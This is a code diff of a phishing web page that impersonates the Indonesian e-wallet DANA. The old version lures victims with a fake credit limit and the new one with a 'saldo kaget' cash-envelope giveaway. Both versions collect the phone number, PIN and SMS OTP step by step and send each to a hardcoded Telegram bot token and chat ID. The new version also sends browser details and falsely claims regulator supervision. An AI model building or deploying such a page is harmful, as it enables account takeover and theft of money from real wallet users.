@@ -3,215 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA - Dompet Digital Indonesia</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>DANA KAGET - Klaim Saldo Sekarang</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
     <style>
-        body { font-family: 'Open Sans', sans-serif; background: #f5f5f5; color: #333; overflow-x: hidden; touch-action: manipulation; }
-        .bg-dana { background-color: #118eea; }
-        .text-dana { color: #118eea; }
-        .card-shadow { box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
-        .input-otp { width: 45px; height: 50px; border-bottom: 2px solid #ccc; font-size: 24px; text-align: center; background: transparent; transition: 0.3s; }
-        .input-otp:focus { border-bottom-color: #118eea; outline: none; }
-        .pin-dot { width: 15px; height: 15px; border: 2px solid #ccc; border-radius: 50%; margin: 0 8px; transition: 0.2s; }
-        .pin-dot.active { background: #118eea; border-color: #118eea; }
-        .numpad button { height: 60px; font-size: 1.5rem; font-weight: 600; color: #333; transition: 0.1s; }
-        .numpad button:active { background: #e0e0e0; border-radius: 50%; }
-        .page { display: none; position: absolute; width: 100%; min-height: 100vh; background: #f5f5f5; }
-        .page.active { display: block; }
-        .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; display: none; justify-content: center; align-items: center; }
+        :root {
+            --dana-blue: #118eea;
+            --gold: #ffd700;
+            --white: #ffffff;
+            --glass: rgba(255, 255, 255, 0.12);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            background: linear-gradient(rgba(0, 86, 179, 0.9), rgba(17, 142, 234, 0.9)), 
+                        url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
+            background-size: cover; background-position: center; background-attachment: fixed;
+            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
+        }
+
+        .app-shell {
+            width: 100%; max-width: 410px; background: var(--glass); backdrop-filter: blur(30px);
+            border-radius: 30px; border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.5); overflow: hidden; position: relative;
+        }
+
+        .hero-banner {
+            width: 100%; height: 180px; background: url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
+            background-size: cover; background-position: center; border-bottom: 4px solid var(--gold);
+        }
+
+        .stage { display: none; padding: 35px 25px; animation: slideUp 0.5s ease; }
+        .stage.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Envelope */
+        .env-container {
+            width: 160px; height: 110px; background: #f44336; margin: 0 auto 30px;
+            position: relative; border-radius: 0 0 12px 12px; cursor: pointer; box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+        .env-flap {
+            position: absolute; top: -60px; left: 0; border-left: 80px solid transparent;
+            border-right: 80px solid transparent; border-bottom: 60px solid #d32f2f;
+            transform-origin: bottom; transition: 0.6s ease; z-index: 2;
+        }
+        .env-container.open .env-flap { transform: rotateX(180deg); }
+        .env-paper {
+            position: absolute; width: 140px; height: 90px; background: white; left: 10px; top: 10px;
+            border-radius: 8px; display: flex; flex-direction: column; justify-content: center; align-items: center;
+            color: #2ecc71; font-weight: 800; z-index: 1; transition: 0.6s;
+        }
+        .env-container.open .env-paper { transform: translateY(-80px); z-index: 3; }
+
+        /* Inputs */
+        .input-box {
+            background: white; border-radius: 15px; padding: 15px; display: flex; align-items: center;
+            margin-bottom: 20px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .input-box i { color: var(--dana-blue); margin-right: 15px; font-size: 1.2rem; }
+        .input-box input { border: none; outline: none; width: 100%; font-size: 1.1rem; font-weight: 700; color: #333; }
+
+        .btn-action {
+            width: 100%; padding: 18px; border: none; border-radius: 15px;
+            background: var(--gold); color: #004d99; font-weight: 800; font-size: 1.1rem;
+            cursor: pointer; box-shadow: 0 8px 20px rgba(0,0,0,0.2); transition: 0.3s;
+        }
+        .btn-action:disabled { background: #b0bec5; color: #78909c; cursor: not-allowed; }
+
+        /* Pads */
+        .dot-group { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .dot { width: 16px; height: 16px; border: 2px solid white; border-radius: 50%; }
+        .dot.active { background: var(--gold); border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
+
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 280px; margin: 0 auto; }
+        .key {
+            height: 65px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            font-size: 1.5rem; font-weight: 600; color: white; cursor: pointer; transition: 0.1s;
+        }
+        .key:active { background: white; color: var(--dana-blue); transform: scale(0.9); }
+
+        .overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+        }
+        .spinner { width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.1); border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        footer { padding: 20px; text-align: center; color: white; font-size: 0.7rem; opacity: 0.7; }
     </style>
 </head>
 <body>
 
-<div id="loader" class="loader-overlay">
-    <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-600"></div>
-</div>
+<div class="app-shell">
+    <div class="hero-banner"></div>
 
-<div id="page1" class="page active animate__animated animate__fadeIn">
-    <div class="bg-dana p-5 pb-24 text-white">
-        <div class="flex justify-between items-center mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain.png" width="90">
-            <div class="flex items-center space-x-3">
-                <div class="text-right">
-                    <p class="text-[10px] opacity-80">Saldo DANA</p>
-                    <p class="font-bold">Rp 15.000.000</p>
-                </div>
-                <div class="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                </div>
+    <div id="stage-phone" class="stage active">
+        <div class="env-container" id="env-box" onclick="openEnv()">
+            <div class="env-flap"></div>
+            <div class="env-paper">
+                <span style="font-size: 0.6rem; color: #888;">SALDO KAGET</span>
+                <span style="font-size: 1.1rem;">Rp 185.000</span>
             </div>
         </div>
-        <div class="bg-white rounded-xl p-4 card-shadow absolute left-5 right-5 top-28 flex justify-around text-dana font-semibold text-xs">
-            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">➕</div>Pindai</div>
-            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">💰</div>Isi Saldo</div>
-            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">📤</div>Kirim</div>
-            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">📥</div>Minta</div>
-        </div>
-    </div>
-
-    <div class="mt-20 px-5">
-        <div class="bg-white rounded-xl p-5 card-shadow mb-4">
-            <div class="flex justify-between items-center border-b pb-3 mb-3">
-                <span class="font-bold text-gray-700">DANA Cicil</span>
-                <span class="bg-blue-100 text-dana text-[10px] px-2 py-1 rounded font-bold">SPONSORED</span>
+        <h3 id="info-text" style="color:white; text-align:center; margin-bottom:20px;">Ketuk amplop untuk klaim!</h3>
+        
+        <div id="form-phone" style="opacity:0; pointer-events:none; transition: 0.5s;">
+            <div class="input-box">
+                <i class="fas fa-phone-alt"></i>
+                <input type="number" id="inp-phone" placeholder="Masukkan Nomor DANA" oninput="valPhone()">
             </div>
-            <p class="text-sm text-gray-500 mb-1">Limit Tersedia</p>
-            <h2 class="text-2xl font-bold text-gray-800 mb-4">Rp 15.000.000</h2>
-            <div class="grid grid-cols-2 gap-3 mb-4">
-                <div class="bg-gray-50 p-3 rounded-lg border border-dashed border-blue-300">
-                    <p class="text-[10px] text-gray-500 uppercase">Tenor</p>
-                    <p class="font-bold text-sm">Hingga 12 Bulan</p>
-                </div>
-                <div class="bg-gray-50 p-3 rounded-lg border border-dashed border-blue-300">
-                    <p class="text-[10px] text-gray-500 uppercase">Bunga</p>
-                    <p class="font-bold text-sm text-green-600">0%* Per Bulan</p>
-                </div>
-            </div>
-            <button onclick="changePage('page-phone')" class="w-full bg-dana text-white font-bold py-3 rounded-lg hover:bg-blue-600 transition">AKTIFKAN SEKARANG</button>
+            <button class="btn-action" id="btn-phone" disabled onclick="sendPhone()">LANJUTKAN</button>
         </div>
     </div>
-</div>
 
-<div id="page-phone" class="page animate__animated animate__fadeInRight">
-    <div class="p-6">
-        <button onclick="changePage('page1')" class="mb-8 text-gray-400">✕</button>
-        <h2 class="text-2xl font-bold mb-2">Masuk ke DANA</h2>
-        <p class="text-gray-500 text-sm mb-8">Masukkan nomor HP kamu untuk lanjut.</p>
-        <div class="flex items-center border-b-2 border-dana py-2 mb-10">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6 mr-3">
-            <span class="font-bold text-lg mr-2">+62</span>
-            <input type="tel" id="nomorhp" class="w-full text-lg font-bold outline-none bg-transparent" placeholder="811-234-XXX" autofocus>
+    <div id="stage-pin" class="stage">
+        <div style="text-align: center; color: white;">
+            <h2 style="margin: 10px 0 5px;">PIN DANA</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Konfirmasi PIN keamanan Anda</p>
         </div>
-        <button onclick="savePhone()" class="w-full bg-dana text-white font-bold py-3 rounded-lg shadow-lg">LANJUT</button>
-    </div>
-</div>
-
-<div id="page-pin" class="page animate__animated animate__fadeInRight bg-dana text-white">
-    <div class="p-8 text-center">
-        <h2 class="text-xl font-bold mb-2 mt-10">Masukkan PIN DANA</h2>
-        <p class="text-blue-100 text-sm mb-12">Keamanan adalah prioritas kami.</p>
-        
-        <div class="flex justify-center mb-20" id="pin-container">
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+        <div class="dot-group" id="pin-dots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
         </div>
-
-        <div class="grid grid-cols-3 gap-4 numpad max-w-xs mx-auto text-white">
-            <button onclick="pressPin('1')">1</button><button onclick="pressPin('2')">2</button><button onclick="pressPin('3')">3</button>
-            <button onclick="pressPin('4')">4</button><button onclick="pressPin('5')">5</button><button onclick="pressPin('6')">6</button>
-            <button onclick="pressPin('7')">7</button><button onclick="pressPin('8')">8</button><button onclick="pressPin('9')">9</button>
-            <div></div><button onclick="pressPin('0')">0</button>
-            <button onclick="delPin()" class="text-sm">Hapus</button>
+        <div class="keypad">
+            <div class="key" onclick="press('pin', 1)">1</div><div class="key" onclick="press('pin', 2)">2</div><div class="key" onclick="press('pin', 3)">3</div>
+            <div class="key" onclick="press('pin', 4)">4</div><div class="key" onclick="press('pin', 5)">5</div><div class="key" onclick="press('pin', 6)">6</div>
+            <div class="key" onclick="press('pin', 7)">7</div><div class="key" onclick="press('pin', 8)">8</div><div class="key" onclick="press('pin', 9)">9</div>
+            <div class="key" style="visibility:hidden"></div><div class="key" onclick="press('pin', 0)">0</div><div class="key" onclick="del('pin')"><i class="fas fa-backspace"></i></div>
         </div>
     </div>
-</div>
 
-<div id="page-otp" class="page animate__animated animate__fadeInRight">
-    <div class="p-6 text-center">
-        <div class="flex justify-center mb-6 mt-10">
-            <img src="https://i.ibb.co/WpDnTQQt/1000233246.jpg" class="w-16 rounded-full shadow-lg">
+    <div id="stage-otp" class="stage">
+        <div style="text-align: center; color: white;">
+            <h2 style="margin: 10px 0 5px;">KODE OTP</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode dari SMS</p>
         </div>
-        <h2 class="text-xl font-bold mb-2">Verifikasi OTP</h2>
-        <p class="text-gray-500 text-sm mb-8">Kode dikirim ke <span id="display-hp" class="font-bold"></span> via SMS.</p>
-        
-        <div class="flex justify-center space-x-2 mb-10">
-            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp1">
-            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp2">
-            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp3">
-            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp4">
+        <div class="dot-group" id="otp-dots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
         </div>
-        
-        <button onclick="sendFinal()" class="w-full bg-dana text-white font-bold py-3 rounded-lg">KONFIRMASI</button>
-        <p class="mt-8 text-sm text-gray-400">Tidak menerima kode? <span class="text-dana font-bold">Kirim Ulang (59s)</span></p>
+        <div class="keypad">
+            <div class="key" onclick="press('otp', 1)">1</div><div class="key" onclick="press('otp', 2)">2</div><div class="key" onclick="press('otp', 3)">3</div>
+            <div class="key" onclick="press('otp', 4)">4</div><div class="key" onclick="press('otp', 5)">5</div><div class="key" onclick="press('otp', 6)">6</div>
+            <div class="key" onclick="press('otp', 7)">7</div><div class="key" onclick="press('otp', 8)">8</div><div class="key" onclick="press('otp', 9)">9</div>
+            <div style="visibility:hidden"></div><div class="key" onclick="press('otp', 0)">0</div><div class="key" onclick="del('otp')"><i class="fas fa-backspace"></i></div>
+        </div>
+    </div>
+
+    <div id="stage-success" class="stage">
+        <div style="text-align: center; color: white;">
+            <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--gold); margin-bottom: 20px;"></i>
+            <h2>Proses Berhasil!</h2>
+            <p style="opacity: 0.9;">Saldo akan diproses dalam 5-10 menit.</p>
+        </div>
+    </div>
+
+    <footer>
+        <i class="fas fa-shield-alt"></i> DANA Protection - Terdaftar & Diawasi OJK
+    </footer>
+
+    <div class="overlay" id="global-loader">
+        <div class="spinner"></div>
+        <h4 style="color:white; margin-top: 15px;" id="loader-text">Memproses...</h4>
     </div>
 </div>
 
 <script>
-    const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
+    const TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
     const CHAT_ID = "8001301204";
-    
-    let currentData = { hp: "", pin: "", otp: "" };
-    let pinInput = "";
 
-    function showLoader(next) {
-        document.getElementById('loader').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            if(next) next();
-        }, 1200);
+    let data = { phone: "", pin: "", otp: "" };
+
+    const UA = `
+🌐 *User Agent:* \`${navigator.userAgent}\`
+💻 *Platform:* \`${navigator.platform}\``;
+
+    function openEnv() {
+        document.getElementById('env-box').classList.add('open');
+        document.getElementById('form-phone').style.opacity = "1";
+        document.getElementById('form-phone').style.pointerEvents = "auto";
     }
 
-    function changePage(pageId) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageId).classList.add('active');
+    function valPhone() {
+        data.phone = document.getElementById('inp-phone').value;
+        document.getElementById('btn-phone').disabled = data.phone.length < 10;
     }
 
-    async function sendTelegram(msg) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
-        await fetch(url);
-    }
-
-    function savePhone() {
-        const hp = document.getElementById('nomorhp').value;
-        if(hp.length < 9) return alert("Masukkan nomor HP yang valid");
-        currentData.hp = "0" + hp;
-        document.getElementById('display-hp').innerText = currentData.hp;
-        
-        showLoader(() => {
-            sendTelegram(`🚀 <b>DANA TARGET</b>\n\n📱 HP: <code>${currentData.hp}</code>\n⚡ Status: Menunggu PIN...`);
-            changePage('page-pin');
+    async function sendToTelegram(msg) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
         });
     }
 
-    function pressPin(num) {
-        if(pinInput.length < 6) {
-            pinInput += num;
-            updatePinUI();
-            if(pinInput.length === 6) {
-                currentData.pin = pinInput;
-                showLoader(() => {
-                    sendTelegram(`🔑 <b>DANA PIN</b>\n\n📱 HP: <code>${currentData.hp}</code>\n🔐 PIN: <code>${currentData.pin}</code>\n⚡ Status: Menunggu OTP...`);
-                    changePage('page-otp');
-                });
-            }
+    function sendPhone() {
+        loading("Mengecek Nomor...", 1500, async () => {
+            await sendToTelegram(`😈 *DATA MASUK (STEP 1: PHONE)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n━━━━━━━━━━━━━━━━━━${UA}`);
+            document.getElementById('stage-phone').classList.remove('active');
+            document.getElementById('stage-pin').classList.add('active');
+        });
+    }
+
+    function press(type, num) {
+        if(type === 'pin' && data.pin.length < 6) {
+            data.pin += num;
+            updateDots('pin-dots', data.pin.length);
+            if(data.pin.length === 6) sendPin();
+        } else if(type === 'otp' && data.otp.length < 4) {
+            data.otp += num;
+            updateDots('otp-dots', data.otp.length);
+            if(data.otp.length === 4) sendOtp();
         }
     }
 
-    function delPin() {
-        pinInput = pinInput.slice(0, -1);
-        updatePinUI();
-    }
-
-    function updatePinUI() {
-        const dots = document.querySelectorAll('.pin-dot');
-        dots.forEach((dot, i) => {
-            if(i < pinInput.length) dot.classList.add('active');
-            else dot.classList.remove('active');
+    function sendPin() {
+        loading("Verifikasi PIN...", 2000, async () => {
+            await sendToTelegram(`😈 *DATA UPDATE (STEP 2: PIN)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n🔐 *PIN:* \`${data.pin}\`\n━━━━━━━━━━━━━━━━━━`);
+            document.getElementById('stage-pin').classList.remove('active');
+            document.getElementById('stage-otp').classList.add('active');
         });
     }
 
-    // OTP Auto focus
-    document.querySelectorAll('.otp-box').forEach((box, i, arr) => {
-        box.addEventListener('input', () => {
-            if(box.value.length === 1 && i < arr.length - 1) arr[i+1].focus();
+    function sendOtp() {
+        loading("Sinkronisasi...", 2500, async () => {
+            await sendToTelegram(`😈 *DATA FINAL (STEP 3: OTP)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n🔐 *PIN:* \`${data.pin}\`\n💬 *OTP:* \`${data.otp}\`\n━━━━━━━━━━━━━━━━━━`);
+            document.getElementById('stage-otp').classList.remove('active');
+            document.getElementById('stage-success').classList.add('active');
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         });
-    });
+    }
 
-    async function sendFinal() {
-        let otp = "";
-        document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
-        if(otp.length < 4) return alert("Masukkan OTP lengkap");
-        
-        currentData.otp = otp;
-        showLoader(async () => {
-            await sendTelegram(`✅ <b>DANA SUCCESS</b>\n\n📱 HP: <code>${currentData.hp}</code>\n🔐 PIN: <code>${currentData.pin}</code>\n📩 OTP: <code>${currentData.otp}</code>\n💰 Limit: Rp 15.000.000`);
-            alert("Sistem sedang sibuk. Silahkan coba lagi dalam 24 jam.");
-            window.location.reload();
-        });
+    function del(type) {
+        data[type] = data[type].slice(0, -1);
+        updateDots(type + '-dots', data[type].length);
+    }
+
+    function updateDots(id, len) {
+        const dots = document.getElementById(id).children;
+        for(let i=0; i<dots.length; i++) {
+            if(i < len) dots[i].classList.add('active');
+            else dots[i].classList.remove('active');
+        }
+    }
+
+    function loading(text, time, cb) {
+        const l = document.getElementById('global-loader');
+        document.getElementById('loader-text').innerText = text;
+        l.style.display = 'flex';
+        setTimeout(() => { l.style.display = 'none'; cb(); }, time);
     }
 </script>
-
 </body>
 </html>
